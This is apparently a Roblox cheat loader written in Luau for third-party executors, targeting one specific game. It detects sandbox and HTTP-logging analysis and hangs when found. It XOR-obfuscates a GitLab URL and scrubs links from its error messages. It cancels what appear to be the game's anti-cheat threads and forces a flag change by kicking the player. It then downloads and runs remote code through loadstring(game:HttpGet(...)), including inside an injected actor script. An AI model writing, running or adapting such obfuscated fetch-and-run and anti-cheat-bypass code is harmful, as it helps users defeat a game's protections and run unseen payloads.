
local CloneFunction = clonefunction or function(fn) return fn end
local CloneRef      = cloneref      or function(x)  return x  end

local StringLower  : (string) -> string                              = CloneFunction(string.lower)
local StringFind   : (string, string, number?, boolean?) -> (number?, number?) = CloneFunction(string.find)
local StringFormat : (string, ...any) -> string                      = CloneFunction(string.format)
local StringGsub   : (string, string, string) -> (string, number)    = CloneFunction(string.gsub)
local StringByte   : (string, number?) -> number                     = CloneFunction(string.byte)
local StringChar   : (...number) -> string                           = CloneFunction(string.char)
local TableConcat  : ({any}, string?) -> string                      = CloneFunction(table.concat)
local MathFmod     : (number, number) -> number                      = CloneFunction(math.fmod)
local Bit32Bxor    : (number, number) -> number                      = CloneFunction(bit32.bxor)
local IPairs                                                         = CloneFunction(ipairs)
local Pairs                                                          = CloneFunction(pairs)
local PCall        : (any, ...any) -> (boolean, ...any)              = CloneFunction(pcall)
local Type         : (any) -> string                                 = CloneFunction(type)
local ToString     : (any) -> string                                 = CloneFunction(tostring)
local Warn         : (...any) -> ()                                  = CloneFunction(warn)
local TaskWait     : (number?) -> number                             = CloneFunction(task.wait)
local TaskSpawn    : (((...any) -> any), ...any) -> thread           = CloneFunction(task.spawn)
local TaskCancel   : (thread) -> ()                                  = CloneFunction(task.cancel)


local GetExecFn = identifyexecutor or getexecutorname or function() return "unknown" end
local ExecName  = StringLower(GetExecFn())


do
    local _, Err = PCall(function()
        string.byte("a", function() return end, 9999, 38)
    end)
    if Err and (StringFind(Err, "httplog", 1, true) or StringFind(Err, "sandbox", 1, true)) then
        while true do end
    end
end


local PLACE_ID: number = 72920620366355

local BLOCKLIST: {[string]: boolean} = {
    xeno   = true,
    solara = true,
}

local SETFFLAG_EXECUTORS: {[string]: boolean} = {
    wave     = true,
    velocity = true,
}

local SCRUB_PATTERNS: {string} = {
    "https?://[%w%-%._~:/%?#%[%]@!%$&'%(%)%*%+,;%%=]+",
    "gitlab%.com",
    "potanginamo373%-lang",
    "op1",
    "main%.lua",
}


local XOR_KEY     = "astro"
local XOR_KEY_LEN = #XOR_KEY

local function XorEncrypt(Input: string): {number}
    local Out: {number} = {}
    for i = 1, #Input do
        local B   = StringByte(Input, i)
        local K   = StringByte(XOR_KEY, MathFmod(i - 1, XOR_KEY_LEN) + 1)
        Out[i] = Bit32Bxor(B, K)
    end
    return Out
end

local function XorDecrypt(Encoded: {number}): string
    local Chars: {string} = {}
    for i, Byte in IPairs(Encoded) do
        local K    = StringByte(XOR_KEY, MathFmod(i - 1, XOR_KEY_LEN) + 1)
        Chars[i] = StringChar(Bit32Bxor(Byte, K))
    end
    return TableConcat(Chars)
end

local ENCODED_URL: {number} = XorEncrypt(
    "https://gitlab.com/potanginamo373-lang/op1/-/raw/main/main.lua"
)


local function Scrub(Msg: string): string
    for _, Pattern in IPairs(SCRUB_PATTERNS) do
        Msg = (StringGsub(Msg, Pattern, "[redacted]"))
    end
    return Msg
end

local function SafeWarn(Msg: string)
    Warn(Scrub(Msg))
end

local function SafePCall(Fn, ...): (boolean, any)
    local Ok, Result = PCall(Fn, ...)
    if not Ok then
        return false, Scrub(ToString(Result))
    end
    return true, Result
end


local Players     = CloneRef(game:GetService("Players"))
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= PLACE_ID then
    Warn(StringFormat("[Loader] Wrong game — expected %d, got %d", PLACE_ID, game.PlaceId))
    LocalPlayer:Kick("Wrong game FN")
    return
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

if BLOCKLIST[ExecName] then
    Warn("[Loader] Executor not supported: " .. ExecName)
    LocalPlayer:Kick("Your executor is not supported.")
    return
end


local FURRY_SCHEMA: {[string]: string} = {
    ["1"]  = "thread",   ["3"]  = "thread",  ["4"]  = "thread", ["5"]  = "thread",
    ["6"]  = "thread",   ["7"]  = "thread",  ["8"]  = "thread", ["9"]  = "thread",
    ["10"] = "thread",   ["ResetEnv"] = "function",
}

local function RunFurry(): boolean
    local Extras = getrenv().shared.extras
    if not Extras then return false end

    for k, ExpectedType in Pairs(FURRY_SCHEMA) do
        if Type(Extras[k]) ~= ExpectedType then
            Warn("[Furry] Schema mismatch at key")
            return false
        end
    end

    for k in Pairs(Extras) do
        if FURRY_SCHEMA[ToString(k)] == nil then
            Warn("[Furry] Unexpected key")
            return false
        end
    end

    for i, v in Pairs(Extras) do
        if Type(v) ~= "thread" then continue end
        Extras[i] = TaskSpawn(function() while TaskWait(9e9) do end end)
        TaskCancel(v)
    end

    TaskWait(1)
    Warn("[Furry] OK")
    return true
end

local FURRY_ACTOR_SCRIPT: string = StringFormat([[
    local SCHEMA = {
        ["1"]  = "thread", ["3"]  = "thread", ["4"]  = "thread", ["5"]  = "thread",
        ["6"]  = "thread", ["7"]  = "thread", ["8"]  = "thread", ["9"]  = "thread",
        ["10"] = "thread", ["ResetEnv"] = "function",
    }
    local Extras = getrenv().shared.extras
    if not Extras then return end
    for k, v in pairs(SCHEMA) do
        if type(Extras[k]) ~= v then
            return warn("[Furry] Schema mismatch")
        end
    end
    for k in pairs(Extras) do
        if SCHEMA[tostring(k)] == nil then
            return warn("[Furry] Unexpected key")
        end
    end
    for i, v in pairs(Extras) do
        if type(v) ~= "thread" then continue end
        Extras[i] = task.spawn(function() while task.wait(9e9) do end end)
        task.cancel(v)
    end
    task.wait(1)
    warn("[Furry] OK")
    loadstring(game:HttpGet(%q))()
]], XorDecrypt(ENCODED_URL))


local function LoadScript()
    local Ok, Chunk = SafePCall(function()
        return loadstring(game:HttpGet(XorDecrypt(ENCODED_URL)))
    end)
    if not Ok then
        SafeWarn("[Loader] Failed to load script")
        return
    end
    local RunOk, RunErr = SafePCall(Chunk)
    if not RunOk then
        SafeWarn("[Loader] Failed to run script: " .. ToString(RunErr))
    end
end


local Actors        = getactors()
local Flag          = getfflag("DebugRunParallelLuaOnMainThread")
local ForceSetfflag = SETFFLAG_EXECUTORS[ExecName]

if not ForceSetfflag and Actors and #Actors > 0 then
    run_on_actor(Actors[1], FURRY_ACTOR_SCRIPT)

elseif not Flag or Flag == "false" then
    setfflag("DebugRunParallelLuaOnMainThread", "true")
    LocalPlayer:Kick("REJOIN THE GAME FUCK FURRY")
else
    TaskSpawn(function()
        if not RunFurry() then
            Warn("[Loader] Furry failed")
            return
        end
        LoadScript()
    end)
end